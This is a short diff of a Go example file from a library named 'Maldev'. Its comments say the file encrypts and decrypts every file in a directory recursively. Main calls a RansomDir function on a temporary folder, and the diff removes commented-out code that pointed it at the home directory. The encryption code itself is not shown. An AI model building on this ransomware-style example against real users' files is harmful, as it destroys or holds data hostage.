@@ -3,7 +3,7 @@ package main
 /*
 
 This is one of the examples of the Maldev library
-The creator is not responsible of any damage or harm done by this software, be careful
+The creator is not responsible of any damage or harm done by this software, be careful!
 
 This file encrypts/decrypts all files in given directory (recursively)
 
@@ -15,7 +15,6 @@ import (
   "strings"
   "log"
 
-  //"github.com/D3Ext/maldev/files"
   "github.com/D3Ext/maldev/crypto"
 )
 
@@ -69,11 +68,6 @@ func DecryptDir(dir_to_decrypt string) {
 }
 
 func main(){
-  /*home_dir, err := os.UserHomeDir() // Get home directory
-  if err != nil {
-    log.Fatal(err)
-  }*/
-
   RansomDir("/tmp/exampledir/")
   //DecryptDir("/tmp/exampledir/")
 }
